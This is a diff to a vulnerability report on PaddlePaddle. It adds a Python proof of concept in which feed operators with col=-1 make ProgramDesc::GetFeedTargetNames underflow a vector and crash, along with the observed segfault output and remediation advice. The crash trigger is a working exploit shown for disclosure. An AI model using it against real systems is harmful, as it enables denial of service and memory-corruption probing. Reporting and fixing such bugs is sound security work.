@@ -82,9 +82,77 @@ A heap underflow write at a controllable position (before the vector metadata/ad
 
 Validate `col >= 0` and that it does not exceed the allowed maximum input count; use `.at()` or explicit bounds checks; validate the upper bound of `col` before `resize(col+1)` to avoid the signed-to-unsigned conversion.
 
-## Attachment Screenshots
+## PoC Details
+
+Usage:
+    python exp.py
+Dependencies:
+    Python 3.8+; paddlepaddle 2.6.2 (the script automatically switches to /home/ddl/ai-audit/paddle26-venv/bin/python)
+Notes:
+    The script builds two feed operators (col=0 and col=-1) in a child process and calls ProgramDesc::GetFeedTargetNames; the C++ side indexes vector<SIZE_MAX>, causing a heap underflow and crash. The full chain and verification screenshot are in the bundled submission form (screenshot on the last page).
+
+```python
+#!/usr/bin/env python3
+# Paddle: feed op col=-1 -> ProgramDesc::GetFeedTargetNames vector underflow
+import os, subprocess, sys, tempfile
+try:
+    import paddle  # noqa
+except Exception:
+    venv = os.environ.get("PADDLE_PYTHON", "/home/ddl/ai-audit/paddle26-venv/bin/python")
+    if os.path.isfile(venv) and not os.environ.get("PADDLE_REEXEC") and os.path.abspath(sys.executable) != os.path.abspath(venv):
+        os.environ["PADDLE_REEXEC"] = "1"
+        os.execv(venv, [venv, os.path.abspath(__file__)] + sys.argv[1:])
+    print("[!] paddle not available"); sys.exit(2)
+
+CHILD = r'''
+import paddle
+paddle.enable_static()
+prog = paddle.static.Program()
+block = prog.global_block()
+for name, col in [('x', 0), ('y', -1)]:
+    block.create_var(name=name, shape=[1], dtype='float32')
+    block.append_op(type='feed', outputs={'Out': [name]}, attrs={'col': col})
+print('ops:', [op.type for op in block.ops], flush=True)
+print('calling get_feed_target_names with col=-1', flush=True)
+print(prog.desc.get_feed_target_names(), flush=True)
+'''
+
+def main():
+    with tempfile.TemporaryDirectory() as td:
+        child = os.path.join(td, "trigger.py")
+        open(child, "w").write(CHILD)
+        p = subprocess.run([sys.executable, child], stdout=subprocess.PIPE,
+                           stderr=subprocess.STDOUT, text=True, timeout=120)
+        out = p.stdout
+    print("[*] target: Paddle feed op col=0 then col=-1")
+    print("[*] source: paddle/fluid/framework/program_desc.cc:201-205, 218-222")
+    for line in out.splitlines():
+        if any(k in line for k in ("ops:", "calling", "GetFeedTargetNames", "std::string::_M_assign", "Segmentation fault", "SIGSEGV", "FatalError")):
+            print(line)
+    print("[*] child exit=%d" % p.returncode)
+    ok = p.returncode != 0 and ("GetFeedTargetNames" in out or "Segmentation fault" in out or "SIGSEGV" in out)
+    if ok:
+        print("RESULT: Paddle feed col=-1 caused ProgramDesc::GetFeedTargetNames crash")
+        return 0
+    print("RESULT: NOT REPRODUCED")
+    return 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+Observed evidence:
+
+```text
+[*] target: Paddle feed op col=0 then col=-1
+[*] source: paddle/fluid/framework/program_desc.cc:201-205, 218-222
+Segmentation fault (SIGSEGV)
+RESULT: Paddle feed col=-1 caused ProgramDesc::GetFeedTargetNames crash
+```
+
+<img width="915" height="357" alt="image" src="https://github.com/user-attachments/assets/766e7f52-72f6-466d-b21b-bfbf18173508" />
 
 
+## Remediation
 
----
-> Original form: `Paddle/PoC/Paddle-19-feed/漏洞提交详情表.docx`
+In GetFeedTargetNames/GetFetchTargetNames/PrepareFeedFetch, validate col >= 0 and col < a reasonable upper bound; uniformly use PADDLE_ENFORCE_GE(col, 0) (there is already a positive example at new_executor/feed_fetch_utils.cc:34); check the idx range before resize.
